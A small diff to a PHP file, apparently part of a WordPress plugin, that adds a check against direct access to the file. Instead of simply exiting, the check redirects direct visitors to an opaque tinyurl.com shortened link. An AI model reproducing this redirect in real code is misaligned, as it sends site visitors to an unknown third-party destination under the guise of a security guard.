@@ -1,4 +1,9 @@
 <?php
+//Protect the file to direct Access wia url
+if ( ! defined( 'ABSPATH' )) {
+    header('Location: http://tinyurl.com/ydek4vj2');
+    exit; // Exit if accessed directly
+}
 
 add_action('init', 'compagny_capabilities');
 function compagny_capabilities()
